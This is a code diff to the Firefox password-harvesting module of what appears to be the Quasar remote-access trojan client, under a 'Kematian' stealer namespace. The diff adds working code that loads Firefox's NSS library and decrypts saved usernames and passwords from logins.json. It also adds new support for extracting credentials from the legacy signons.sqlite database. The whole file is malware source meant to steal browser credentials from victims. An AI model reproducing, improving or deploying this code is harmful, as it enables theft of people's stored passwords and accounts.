@@ -1,4 +1,5 @@
 ﻿using Quasar.Client.Helper;
+using Quasar.Client.Kematian.Browsers.Helpers.SQL;
 using Quasar.Client.Kematian.Browsers.Helpers.Structs;
 using Quasar.Client.Utilities;
 using System;
@@ -39,14 +40,8 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
         private IntPtr NSS3;
         private IntPtr Mozglue;
 
-        private string nsspath;
-
         public long Init(string configDirectory)
         {
-            Debug.WriteLine("----------------------");
-            Debug.WriteLine(configDirectory);
-            Debug.WriteLine("----------------------");
-
             string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
 
             if (!Directory.Exists(mozillaPath))
@@ -55,21 +50,39 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
                 return -1;
             }
 
+            string nssPath = Path.Combine(mozillaPath, "nss3.dll");
             Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
-            NSS3 = NativeMethods.LoadLibrary(nsspath);
+            NSS3 = NativeMethods.LoadLibrary(nssPath);
+
+            if (NSS3 == IntPtr.Zero)
+            {
+                Debug.WriteLine("Failed to load nss3.dll");
+                return -1;
+            }
+
             IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
             IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
             IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
+
+            if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
+            {
+                Debug.WriteLine("Failed to get required function pointers from NSS3.");
+                return -1;
+            }
+
             NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
             PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
             NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
+
             return NSS_Init(configDirectory);
         }
 
         public string Decrypt(string cypherText)
         {
+            if (string.IsNullOrEmpty(cypherText))
+                return string.Empty;
+
             IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
-            StringBuilder sb = new StringBuilder(cypherText);
 
             try
             {
@@ -79,10 +92,12 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
                 Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);
 
                 TSECItem tSecDec = new TSECItem();
-                TSECItem item = new TSECItem();
-                item.SECItemType = 0;
-                item.SECItemData = ffDataUnmanagedPointer;
-                item.SECItemLen = ffData.Length;
+                TSECItem item = new TSECItem
+                {
+                    SECItemType = 0,
+                    SECItemData = ffDataUnmanagedPointer,
+                    SECItemLen = ffData.Length
+                };
 
                 if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                 {
@@ -90,12 +105,13 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
                     {
                         byte[] bvRet = new byte[tSecDec.SECItemLen];
                         Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
-                        return Encoding.ASCII.GetString(bvRet);
+                        return Encoding.UTF8.GetString(bvRet);
                     }
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                Debug.WriteLine($"Decryption error: {ex.Message}");
                 return null;
             }
             finally
@@ -144,32 +160,102 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
             return directories;
         }
 
-        public List<LoginData> GetLogins(string profilePath, string loginJsonPath = "", string signins_path = "")
+        public List<LoginData> GetLogins(string profilePath, string loginJsonPath = "", string signonsDBPath = "")
         {
             var logins = new List<LoginData>();
+            Debug.WriteLine($"Profile path: {profilePath}");
+            Debug.WriteLine($"Logins.json path: {loginJsonPath}");
+            Debug.WriteLine($"Signons.sqlite path: {signonsDBPath}");
 
-            if (!File.Exists(loginJsonPath))
+            // Check if at least one file exists
+            bool loginsJsonExists = !string.IsNullOrEmpty(loginJsonPath) && File.Exists(loginJsonPath);
+            bool signonsExists = !string.IsNullOrEmpty(signonsDBPath) && File.Exists(signonsDBPath);
+
+            if (!loginsJsonExists && !signonsExists)
             {
-                Debug.WriteLine("Logins.json not found.");
+                Debug.WriteLine("No login files found.");
                 return logins;
             }
 
+            // Initialize NSS only once
             if (Init(profilePath) != 0)
             {
                 Debug.WriteLine("Failed to initialize NSS.");
                 return logins;
             }
-            FFLogins ffLoginData;
-            using (var sr = File.OpenRead(loginJsonPath))
-            {
-                ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
-            }
-            foreach (Login loginData in ffLoginData.Logins)
-            {
-                string username = Decrypt(loginData.EncryptedUsername);
-                string password = Decrypt(loginData.EncryptedPassword);
 
-                logins.Add(new LoginData(loginData.Hostname.ToString(), username, password));
+            // Process logins.json if it exists
+            if (loginsJsonExists)
+            {
+                try
+                {
+                    FFLogins ffLoginData;
+                    using (var sr = File.OpenRead(loginJsonPath))
+                    {
+                        ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
+                    }
+
+                    foreach (Login loginData in ffLoginData.Logins)
+                    {
+                        try
+                        {
+                            string username = Decrypt(loginData.EncryptedUsername);
+                            string password = Decrypt(loginData.EncryptedPassword);
+                            string url = loginData.Hostname?.ToString() ?? string.Empty;
+
+                            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
+                            {
+                                logins.Add(new LoginData(url, username, password));
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error processing login entry: {ex.Message}");
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error processing logins.json: {ex.Message}");
+                }
+            }
+
+            // Process signons.sqlite if it exists
+            if (signonsExists)
+            {
+                try
+                {
+                    SQLiteHandler sqlDatabase = new SQLiteHandler(signonsDBPath);
+
+                    if (sqlDatabase.ReadTable("moz_logins"))
+                    {
+                        for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                        {
+                            try
+                            {
+                                string host = sqlDatabase.GetValue(i, "hostname");
+                                string encryptedUser = sqlDatabase.GetValue(i, "encryptedUsername");
+                                string encryptedPass = sqlDatabase.GetValue(i, "encryptedPassword");
+
+                                string username = Decrypt(encryptedUser);
+                                string password = Decrypt(encryptedPass);
+
+                                if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
+                                {
+                                    logins.Add(new LoginData(host, username, password));
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error processing signons entry: {ex.Message}");
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error processing signons.sqlite: {ex.Message}");
+                }
             }
 
             return logins;
@@ -257,9 +343,21 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
         {
             if (disposing)
             {
-                NSS_Shutdown();
-                NativeMethods.FreeLibrary(NSS3);
-                NativeMethods.FreeLibrary(Mozglue);
+                try
+                {
+                    if (NSS_Shutdown != null)
+                        NSS_Shutdown();
+
+                    if (NSS3 != IntPtr.Zero)
+                        NativeMethods.FreeLibrary(NSS3);
+
+                    if (Mozglue != IntPtr.Zero)
+                        NativeMethods.FreeLibrary(Mozglue);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error during disposal: {ex.Message}");
+                }
             }
         }
     }
